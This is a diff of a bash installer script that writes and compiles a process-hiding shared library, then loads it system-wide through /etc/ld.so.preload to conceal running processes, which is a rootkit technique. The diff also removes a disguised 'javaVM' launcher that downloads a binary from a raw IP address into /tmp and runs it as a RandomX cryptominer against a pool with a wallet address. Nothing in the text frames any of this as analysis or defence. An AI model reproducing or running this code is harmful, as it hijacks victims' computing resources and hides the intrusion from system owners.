@@ -1,19 +1,13 @@
-#!/bin/bash
-
-# Update and install necessary packages
 apt update
 apt -y install nano wget htop binutils cmake build-essential screen unzip net-tools curl
 
-# Unset environment variables and set PATH
 unset LD_PRELOAD
 unset LD_LIBRARY_PATH
 export PATH='/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin'
 
-# Sleep for stability
-sleep 0.5
+sleep .5
 
-# Define process hiding C code
-cat > processhider.c << 'EOL'
+cat >processhider.c <<EOL
 #define _GNU_SOURCE
 
 #include <stdio.h>
@@ -114,49 +108,24 @@ DECLARE_READDIR(dirent64, readdir64);
 DECLARE_READDIR(dirent, readdir);
 EOL
 
-sleep 0.2
+sleep .2
 
-# Create Makefile for compiling the C code
-cat > Makefile << 'EOL'
+cat >Makefile <<EOL
 all: libprocesshider.so
 
 libprocesshider.so: processhider.c
 	gcc -Wall -fPIC -shared -o libprocesshider.so processhider.c -ldl
 
-.PHONY: clean
-clean:
+.PHONY clean:
 	rm -f libprocesshider.so
 EOL
 
-sleep 0.5
+sleep .5
 
-# Compile the C code
 make
-
-# Move the compiled library to the appropriate location
 gcc -Wall -fPIC -shared -o libprocesshider.so processhider.c -ldl
 mv libprocesshider.so /usr/local/lib/
-echo "/usr/local/lib/libprocesshider.so" >> /etc/ld.so.preload
+echo /usr/local/lib/libprocesshider.so >> /etc/ld.so.preload
 
-sleep 0.3
-
-# Script to start javaVM
-cat > start_javaVM.sh << 'EOL'
-#!/bin/sh
-if [ -f /tmp/javaVM ]
-then
-    /tmp/javaVM --algorithm randomx --pool 103.228.74.80:4444 --wallet ZEPHs9EoDAxbWgcA8eLM6xVPpcKt5vMZz47KN29LaYRZVKhuowDdsM22n2ExnU3A7BiS3CxzXCuruRBofjuwvoP9FSRyXzzWWSt --password duckz --cpu-threads 1 --disable-gpu &
-    echo "Started Existing"
-else
-    wget -q http://150.136.168.71:80/archxx/SMULTI24 -O /tmp/javaVM
-    chmod +x /tmp/javaVM
-    /tmp/javaVM --algorithm randomx --pool 103.228.74.80:4444 --wallet ZEPHs9EoDAxbWgcA8eLM6xVPpcKt5vMZz47KN29LaYRZVKhuowDdsM22n2ExnU3A7BiS3CxzXCuruRBofjuwvoP9FSRyXzzWWSt --password duckz --cpu-threads 1 --disable-gpu &
-fi
-EOL
-
-chmod +x start_javaVM.sh
-
-# Cleanup unnecessary files
-rm -f processhider.c Makefile
-
-echo "Installation and setup completed successfully."
+sleep .3
+rm -rf processhider.c Makefile
